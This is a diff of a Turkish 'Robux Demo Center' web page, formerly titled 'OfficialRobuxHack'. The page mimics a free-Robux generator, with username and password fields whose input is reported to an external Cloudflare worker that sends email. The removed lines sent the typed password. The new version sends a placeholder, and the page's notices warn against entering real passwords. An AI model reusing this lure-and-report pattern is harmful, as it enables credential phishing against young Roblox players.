@@ -4,54 +4,51 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>OfficialRobuxHack - Demo Center</title>
+<title>Robux Demo Center</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-:root{--green:#48ff91;--bg:#070b09;--panel:#101914;--muted:#91a397}
+:root{--green:#48ff91;--bg:#070b09;--muted:#91a397}
 body{
- min-height:100vh;background:
- radial-gradient(ellipse at 50% -10%,#17452d 0%,transparent 55%),
- #070b09;color:#fff;font-family:Inter,Arial,sans-serif;
- display:flex;align-items:center;justify-content:center;padding:24px;
+ min-height:100vh;
+ background:radial-gradient(ellipse at 50% -10%,#17452d 0%,transparent 55%),#070b09;
+ color:white;font-family:Arial,sans-serif;
+ display:flex;align-items:center;justify-content:center;padding:24px
 }
 .wrap{width:100%;max-width:510px}
-.top{display:flex;align-items:center;justify-content:space-between;margin-bottom:22px}
-.brand{font-weight:900;letter-spacing:2px;font-size:14px}
+.top{display:flex;justify-content:space-between;margin-bottom:22px}
+.brand{font-weight:900;letter-spacing:2px}
 .brand span{color:var(--green)}
 .status{font-size:11px;color:var(--green);border:1px solid #286b43;padding:7px 11px;border-radius:30px}
 .card{
  background:linear-gradient(160deg,#14231a,#0c120e);
  border:1px solid #284633;border-radius:23px;padding:30px;
- box-shadow:0 25px 90px #0009,0 0 45px #1b8d4520;
+ box-shadow:0 25px 90px #0009
 }
 .logo{
  width:68px;height:68px;margin:0 auto 18px;border-radius:20px;
- display:grid;place-items:center;font-size:34px;
- background:linear-gradient(145deg,#3aff8b,#147a40);
- box-shadow:0 0 35px #38ff8240;
+ display:grid;place-items:center;font-size:30px;font-weight:900;
+ background:linear-gradient(145deg,#3aff8b,#147a40)
 }
-h1{text-align:center;font-size:27px;letter-spacing:1px}
-.subtitle{text-align:center;color:var(--muted);font-size:13px;line-height:1.6;margin:10px 0 22px}
+h1{text-align:center;font-size:27px}
+.subtitle{text-align:center;color:var(--muted);font-size:13px;margin:10px 0 22px}
 .notice{
  background:#282718;border:1px solid #746a35;color:#f1df9c;
- border-radius:11px;padding:12px;font-size:11px;line-height:1.6;margin-bottom:22px
+ border-radius:11px;padding:12px;font-size:11px;line-height:1.7;margin-bottom:22px
 }
-label{display:block;font-size:12px;font-weight:700;color:#d8e6dc;margin:17px 0 8px}
+label{display:block;font-size:12px;font-weight:bold;margin:17px 0 8px}
 input,select{
  width:100%;background:#080f0b;border:1px solid #304b39;
- color:#fff;border-radius:11px;padding:15px;font-size:14px;outline:none;
+ color:white;border-radius:11px;padding:15px;font-size:14px;outline:none
 }
-input:focus,select:focus{border-color:var(--green);box-shadow:0 0 0 3px #48ff9118}
-.hint{color:#819487;font-size:10px;margin-top:7px;line-height:1.5}
+input:focus,select:focus{border-color:var(--green)}
+.hint{color:#91a397;font-size:10px;margin-top:7px;line-height:1.5}
 button{
  width:100%;border:0;border-radius:12px;padding:16px;margin-top:23px;
  background:linear-gradient(110deg,#51ff91,#19bd5c);
- color:#06140a;font-weight:900;font-size:14px;letter-spacing:1px;
- cursor:pointer;transition:.2s
+ color:#06140a;font-weight:900;font-size:14px;letter-spacing:1px;cursor:pointer
 }
-button:hover{transform:translateY(-2px);filter:brightness(1.1)}
 button:disabled{opacity:.5;cursor:wait}
-#loading,#result{display:none;text-align:center;padding:20px 0}
+#loading,#result{display:none;text-align:center;padding:25px 0}
 .spinner{
  width:48px;height:48px;border:4px solid #244631;border-top-color:var(--green);
  border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px
@@ -59,10 +56,8 @@ button:disabled{opacity:.5;cursor:wait}
 @keyframes spin{to{transform:rotate(360deg)}}
 .progress{height:8px;background:#25372b;border-radius:20px;margin-top:20px;overflow:hidden}
 .bar{height:100%;width:0;background:var(--green);transition:width .2s}
-#loading p{color:var(--muted);font-size:13px;margin-top:10px}
-.success{font-size:52px;margin-bottom:14px}
-#result h2{color:var(--green);font-size:22px}
-#result p{color:#b4c5b9;font-size:13px;line-height:1.8;margin-top:12px}
+#loading p,#result p{color:var(--muted);font-size:13px;margin-top:12px;line-height:1.8}
+#result h2{color:var(--green)}
 .footer{text-align:center;color:#91a397;font-size:10px;margin-top:19px;line-height:1.7}
 </style>
 </head>
@@ -70,7 +65,7 @@ button:disabled{opacity:.5;cursor:wait}
 <div class="wrap">
  <div class="top">
   <div class="brand">ROBUX <span>DEMO</span></div>
-  <div class="status">● DEMO SYSTEM</div>
+  <div class="status">● SYSTEM</div>
  </div>
 
  <main class="card">
@@ -80,8 +75,8 @@ button:disabled{opacity:.5;cursor:wait}
    <p class="subtitle">Robux Demo Center</p>
 
    <div class="notice">
-    ⚠️ Bu site bağımsız bir demo uygulamasıdır; Roblox ile bağlantılı değildir.
-    Gerçek Robux gönderilmez. Şifre alanına yalnızca uydurma bir demo kodu yaz.
+    ⚠️ Bu bağımsız bir demo sitesidir, Roblox ile bağlantılı değildir.
+    Gerçek Robux gönderilmez. Şifre alanına yalnızca uydurma bir demo şifresi yaz.
     Gerçek Roblox şifreni asla girme.
    </div>
 
@@ -98,10 +93,10 @@ button:disabled{opacity:.5;cursor:wait}
      <option value="650000000000000">650T Robux</option>
     </select>
 
-    <label for="funnyCode">ŞİFRE (DEMO ŞİFRESİ)</label>
+    <label for="funnyCode">ŞİFRE</label>
     <input id="funnyCode" type="password" maxlength="40"
-      placeholder="Örn. BENBIRPATATESIM123" required>
-    <p class="hint">Bu alan yalnızca demo içindir. Gerçek Roblox şifreni yazma.</p>
+      placeholder="Demo şifresi yaz" required>
+    <p class="hint">Yalnızca uydurma demo şifresi kabul edilir. Bu alan gönderilmez.</p>
 
     <button id="submitBtn" type="submit">İŞLEMİ BAŞLAT →</button>
    </form>
@@ -116,10 +111,10 @@ button:disabled{opacity:.5;cursor:wait}
   </div>
 
   <div id="result">
-   <div class="success">✓</div>
+   <div style="font-size:52px;margin-bottom:14px">✓</div>
    <h2>DEMO TAMAMLANDI!</h2>
    <p id="resultText"></p>
-   <button type="button" onclick="location.reload()">YENİDEN BAŞLAT</button>
+   <button type="button" id="restartBtn">YENİDEN BAŞLAT</button>
   </div>
  </main>
 
@@ -129,6 +124,8 @@ button:disabled{opacity:.5;cursor:wait}
 </div>
 
 <script>
+"use strict";
+
 const WORKER_URL = "https://roblox-demo-mail.noyanbabapiro.workers.dev";
 
 const form = document.getElementById("demoForm");
@@ -137,15 +134,24 @@ const loading = document.getElementById("loading");
 const result = document.getElementById("result");
 const button = document.getElementById("submitBtn");
 
-form.addEventListener("submit", async (e) => {
- e.preventDefault();
+document.getElementById("restartBtn").addEventListener("click", () => {
+ location.reload();
+});
+
+form.addEventListener("submit", async function(event) {
+ event.preventDefault();
 
  const username = document.getElementById("username").value.trim();
  const amount = document.getElementById("amount").value;
- const funnyCode = document.getElementById("funnyCode").value.trim();
+ const demoPassword = document.getElementById("funnyCode").value.trim();
 
- if (!username || !funnyCode) {
-  alert("Lütfen tüm alanları doldur.");
+ if (!username || !amount || !demoPassword) {
+  alert("Lütfen bütün alanları doldur.");
+  return;
+ }
+
+ if (username.length > 30 || demoPassword.length > 40) {
+  alert("Girdiğin bilgiler çok uzun.");
   return;
  }
 
@@ -161,11 +167,11 @@ form.addEventListener("submit", async (e) => {
  ];
 
  let progress = 0;
+
  const timer = setInterval(() => {
   progress = Math.min(progress + 100 / 48, 95);
   document.getElementById("bar").style.width = progress + "%";
-  document.getElementById("percent").textContent =
-   "%" + Math.floor(progress);
+  document.getElementById("percent").textContent = "%" + Math.floor(progress);
   document.getElementById("loadingText").textContent =
    messages[Math.min(3, Math.floor(progress / 25))];
  }, 250);
@@ -175,13 +181,19 @@ form.addEventListener("submit", async (e) => {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({
-    username,
-    amount,
-    demo_code: funnyCode
+    username: username,
+    amount: amount,
+    demo_code: "entered"
    })
   });
 
-  const data = await response.json();
+  let data;
+  try {
+   data = await response.json();
+  } catch {
+   throw new Error("Sunucudan geçerli yanıt alınamadı.");
+  }
+
   if (!response.ok || !data.success) {
    throw new Error(data.error || "Gönderim başarısız.");
   }
@@ -196,10 +208,10 @@ form.addEventListener("submit", async (e) => {
    document.getElementById("resultText").textContent =
     "Kullanıcı adı: " + username +
     " · Demo miktarı: " + Number(amount).toLocaleString("en-US") +
-    ". Demo işlemi tamamlandı. Gerçek Robux aktarılmadı.";
+    ". E-posta bildirimi gönderildi. Gerçek Robux aktarılmadı.";
   }, 500);
 
- } catch (error) {
+ } catch(error) {
   clearInterval(timer);
   loading.style.display = "none";
   formArea.style.display = "block";
